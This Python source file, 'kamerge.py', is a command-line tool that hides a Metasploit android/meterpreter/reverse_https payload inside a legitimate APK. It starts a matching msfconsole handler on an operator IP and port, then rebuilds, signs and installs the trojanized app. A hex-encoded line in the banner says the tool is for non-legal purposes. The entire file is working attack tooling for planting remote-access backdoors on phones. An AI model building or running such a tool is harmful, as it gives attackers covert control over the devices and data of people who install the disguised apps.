"""
kamerge.py - APK payload injector and Metasploit handler launcher
Author: [Your Name]
Description: Command-line tool to inject Metasploit payloads into APKs and automate handler setup.
"""

# === Imports ===
import os  # For running shell commands
import readline  # For enhanced input (history, etc.)
from rich import print  # For colored terminal output
import subprocess # For running shell commands




class APKToolManager:
    def __init__(self, apk_path, keystore_path="my-release-key.jks", alias="mykey"):
        self.apk_path = apk_path
        self.decoded_dir = os.path.splitext(apk_path)[0] + "_decoded"
        self.recompiled_apk = os.path.splitext(apk_path)[0] + "_recompiled.apk"
        self.signed_apk = os.path.splitext(apk_path)[0] + "_signed.apk"
        self.keystore = keystore_path
        self.alias = alias
    def generate_keystore(
        self,
        keystore_path="my-release-key.jks",
        alias="mykey",
        storepass="android",
        keypass="android",
        dname="CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, S=Unknown, C=US",
        keyalg="RSA",
        keysize=2048,
        validity=10000
    ):
        if os.path.exists(keystore_path):
            print(f"[!] Keystore already exists at: {keystore_path}")
            return

        cmd = (
            f'keytool -genkey -v -keystore "{keystore_path}" '
            f'-alias "{alias}" -keyalg {keyalg} -keysize {keysize} -validity {validity} '
            f'-storepass "{storepass}" -keypass "{keypass}" '
            f'-dname "{dname}"'
        )

        print(f"[+] Generating keystore at {keystore_path}...")
        result = subprocess.run(cmd, shell=True)

        if result.returncode == 0:
            print(f"[✓] Keystore generated successfully: {keystore_path}")
        else:
            print("[✗] Failed to generate keystore.")




    def run_cmd(self, cmd):
        print(f"[+] Running: {cmd}")
        result = subprocess.run(cmd, shell=True)
        if result.returncode != 0:
            raise Exception(f"Command failed: {cmd}")

    def decode_apk(self):
        self.run_cmd(f"apktool d {self.apk_path} -o {self.decoded_dir} -f")

    def view_java_source(self, output_dir="jadx_output"):
        self.run_cmd(f"jadx -d {output_dir} {self.apk_path}")

    def build_apk(self):
        self.run_cmd(f"apktool b {self.decoded_dir} -o {self.recompiled_apk} --use-aapt2")

    def generate_keystore(self):
        if not os.path.exists(self.keystore):
            print("[*] Generating keystore...")
            self.run_cmd(
                f'keytool -genkey -v -keystore {self.keystore} -keyalg RSA '
                f'-keysize 2048 -validity 10000 -alias {self.alias} -storepass android -keypass android '
                f'-dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, S=Unknown, C=US"'
            )

    def sign_apk(self):
        self.generate_keystore()
        self.run_cmd(
            f"apksigner sign --ks {self.keystore} --ks-pass pass:android "
            f"--key-pass pass:android --out {self.signed_apk} {self.recompiled_apk}"
        )

    def install_apk(self):
        self.run_cmd(f"adb install -r {self.signed_apk}")

    def full_process(self):
        self.decode_apk()
        print("[*] Edit smali files in:", os.path.join(self.decoded_dir, "smali"))
        input("[!] Press Enter when you're done editing...")
        self.run_cmd(f"apktool b {self.decoded_dir} -o {self.recompiled_apk} --use-aapt2")
        self.sign_apk()
        self.install_apk()
        print("[+] Done!")




# === Banner and Menus ===
banner = """[red]
██╗  ██╗ █████╗ ███╗   ███╗███████╗██████╗  ██████╗ ███████╗
██║ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝
█████╔╝ ███████║██╔████╔██║█████╗  ██████╔╝██║  ███╗█████╗  
██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║██╔══╝  
██║  ██╗██║  ██║██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝[/red]
61 20 74 6F 6F 6C 20 6D 61 64 65 20 62 79 20 6D 
65 20 74 6F 20 74 75 72 6E 20 69 6E 6A 65 63 74 
20 6F 72 20 6D 65 72 67 65 20 6D 61 6C 69 63 69 
6F 75 73 20 61 70 6B 73 20 69 6E 74 6F 20 61 20 
6E 6F 72 6D 61 6C 20 61 70 6B 20 66 6F 72 20 6E 
6F 6E 20 6C 65 67 61 6C 20 70 75 72 70 6F 73 65 
73 20 0A 49 27 6D 20 6E 6F 74 20 67 61 79 61 20
"""

menu_1 = """    
1. Inject a Metasploit framework payload into an APK with a Metasploit session
2. APKToolManager (decompile, recompile, sign, install, etc)
3. More help
0. Exit
"""

menu_2 = """
[green]To run this tool you will need:[/green]
1. apktool
2. apksigner
3. zipalign
4. metasploit framework
5. (Optional) Other dependencies
"""

# === Utility Functions ===
def yesorno():
    """Prompt user for a yes/no answer. Returns True for yes, False for no."""
    while True:
        user_input = input("(y/n) : ").strip().lower()
        if user_input in ("y", "yes"):
            return True
        elif user_input in ("n", "no"):
            return False
        else:
            print("Invalid input, please enter 'y' or 'n'.")

def hinput(value_array):
    """Prompt user for a set of values, confirm, and return as a dict."""
    result = {}
    while True:
        # Collect input for each required value
        for item in value_array:
            result[item] = input(f"Set {item}: ")
        # Show summary and confirm
        for item in value_array:
            print(f"{item} is set to {result[item]}")
        print("[yellow]* Are you sure?[/yellow]")
        if yesorno():
            break
        else:
            print("[red]Please re-enter the values.[/red]")
    return result

# === Main Application Logic ===
def main():
    """Main menu loop for kamerge tool."""
    print(banner)
    running = True
    while running:
        print(menu_1)
        choice = input("Enter your choice (default is 1): ").strip()
        if choice == "1" or choice == "":
            print("Injecting a Metasploit framework payload into an APK with a Metasploit session")
            options = ["ip addr", "port", "apk", "output name"]
            user_input = hinput(options)
            command = (
                f"msfvenom -x {user_input['apk']} -p android/meterpreter/reverse_https "
                f"-a dalvik --platform android lhost={user_input['ip addr']} lport={user_input['port']} "
                f"-o {user_input['output name']}.apk"
            )
            print(f"[green]Running command: {command}[/green]")
            os.system(command)
            print("[yellow]Start msfconsole handler?[yellow]")
            if yesorno():
                handler_cmd = (
                    f"msfconsole -q -x 'use exploit/multi/handler; "
                    f"set payload android/meterpreter/reverse_https; "
                    f"set LHOST {user_input['ip addr']}; set LPORT {user_input['port']}; exploit'"
                )
                os.system(handler_cmd)
            print("[yellow]Do you want to manage the APK with APKToolManager?[/yellow]")
            if yesorno():
                apk_path = f"{user_input['output name']}.apk"
                run_apktoolmanager_menu(apk_path)
        elif choice == "2":
            apk_path = input("Enter APK file path to manage: ").strip()
            if not apk_path:
                print("No APK path provided.")
            else:
                run_apktoolmanager_menu(apk_path)
        elif choice == "3":
            print(menu_2)
        elif choice == "0":
            print("Exiting...")
            running = False
        else:
            print("Invalid choice, please try again.")

# === APKToolManager Menu Function ===
def run_apktoolmanager_menu(apk_path):
    manager = APKToolManager(apk_path)
    while True:
        print("\nAPKToolManager Actions:")
        print("[1] Decode APK (decompile)")
        print("[2] Build APK (recompile)")
        print("[3] Sign APK")
        print("[4] Install APK")
        print("[5] Full process (decode, edit, build, sign, install)")
        print("[6] Generate Keystore")
        print("[7] View Java Source (jadx)")
        print("[0] Exit APKToolManager menu")
        action = input("Choose APKToolManager action: ").strip()
        if action == "1":
            manager.decode_apk()
        elif action == "2":
            manager.build_apk()
        elif action == "3":
            manager.sign_apk()
        elif action == "4":
            manager.install_apk()
        elif action == "5":
            manager.full_process()
        elif action == "6":
            manager.generate_keystore()
        elif action == "7":
            manager.view_java_source()
        elif action == "0":
            print("Exiting APKToolManager menu.")
            break
        else:
            print("Invalid choice, please try again.")

# === Entry Point ===
if __name__ == "__main__":
    main()